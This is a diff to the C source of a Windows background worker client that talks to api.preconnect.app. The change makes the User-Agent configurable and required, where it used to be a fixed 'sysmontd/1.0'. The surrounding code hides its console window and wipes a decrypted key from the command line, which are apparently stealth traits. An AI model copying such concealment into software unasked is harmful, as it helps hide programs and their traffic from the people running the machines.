@@ -55,6 +55,8 @@ typedef struct {
 } Host;
 
 static char g_key[512] = {0};
+static char g_ua[256] = {0};
+static wchar_t g_ua_w[256] = {0};
 static char g_ident[256] = {0};
 static char g_last_id[128] = {0};
 static char g_active_id[128] = {0};
@@ -238,7 +240,7 @@ void add_auth(HINTERNET req, const wchar_t *type) {
     LeaveCriticalSection(&g_ip_lock);
     if (has_ip) WinHttpAddRequestHeaders(req, L"Host: api.preconnect.app\r\n", (DWORD)-1, WINHTTP_ADDREQ_FLAG_ADD);
     wchar_t buf[2048];
-    int len = wnsprintfW(buf, 2048, L"User-Agent: sysmontd/1.0\r\nAuthorization: Bearer %hs\r\nX-Worker-Key: %hs\r\nX-Worker-Jobs: %lu\r\nX-Worker-Ident: %hs\r\n", g_jwt, g_key, g_jobs, g_ident);
+    int len = wnsprintfW(buf, 2048, L"User-Agent: %hs\r\nAuthorization: Bearer %hs\r\nX-Worker-Key: %hs\r\nX-Worker-Jobs: %lu\r\nX-Worker-Ident: %hs\r\n", g_ua, g_jwt, g_key, g_jobs, g_ident);
     if (type) {
         wnsprintfW(buf + len, 2048 - len, L"Content-Type: %ls\r\n", type);
     } else {
@@ -308,9 +310,21 @@ void load_key(int argc, char *argv[]) {
     for (int i = 1; i < argc; i++) {
         if (lstrcmpA(argv[i], "--debug") == 0) g_debug = TRUE;
         else if (lstrcmpA(argv[i], "--service") == 0) g_service = TRUE;
-        else if (lstrlenA(argv[i]) > 0 && argv[i][0] != '-' && g_key[0] == '\0') {
-            decrypt_key(argv[i], g_key, sizeof(g_key));
-            SecureZeroMemory(argv[i], lstrlenA(argv[i]));
+        else if (lstrlenA(argv[i]) > 0 && argv[i][0] != '-') {
+            if (g_key[0] == '\0') {
+                decrypt_key(argv[i], g_key, sizeof(g_key));
+                SecureZeroMemory(argv[i], lstrlenA(argv[i]));
+            } else if (g_ua[0] == '\0') {
+                lstrcpynA(g_ua, argv[i], sizeof(g_ua));
+                MultiByteToWideChar(CP_UTF8, 0, g_ua, -1, g_ua_w, sizeof(g_ua_w) / sizeof(wchar_t));
+            }
+        }
+    }
+    if (g_ua[0] == '\0') {
+        char env_ua[256] = {0};
+        if (GetEnvironmentVariableA("USER_AGENT", env_ua, sizeof(env_ua)) > 0 && env_ua[0] != '\0') {
+            lstrcpynA(g_ua, env_ua, sizeof(g_ua));
+            MultiByteToWideChar(CP_UTF8, 0, g_ua, -1, g_ua_w, sizeof(g_ua_w) / sizeof(wchar_t));
         }
     }
     const char *env_vars[] = {"PRINTER_KEY", "KEY", "WORKER_KEY"};
@@ -983,7 +997,7 @@ void run_app() {
     InitializeCriticalSectionAndSpinCount(&g_ip_lock, 4000);
     set_host(DEF_HOST, probe_host(DEF_HOST));
 
-    g_session = WinHttpOpen(L"sysmontd/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    g_session = WinHttpOpen(g_ua_w, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (g_session) {
         DWORD protos = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
         WinHttpSetOption(g_session, WINHTTP_OPTION_SECURE_PROTOCOLS, &protos, sizeof(protos));
@@ -1040,8 +1054,8 @@ int main(int argc, char *argv[]) {
         HWND h = GetConsoleWindow();
         if (h) ShowWindow(h, SW_HIDE);
     }
-    if (g_key[0] == '\0') {
-        log_msg("ERR", "key required");
+    if (g_key[0] == '\0' || g_ua[0] == '\0') {
+        log_msg("ERR", "key and user-agent required");
         return 1;
     }
     if (g_service) {
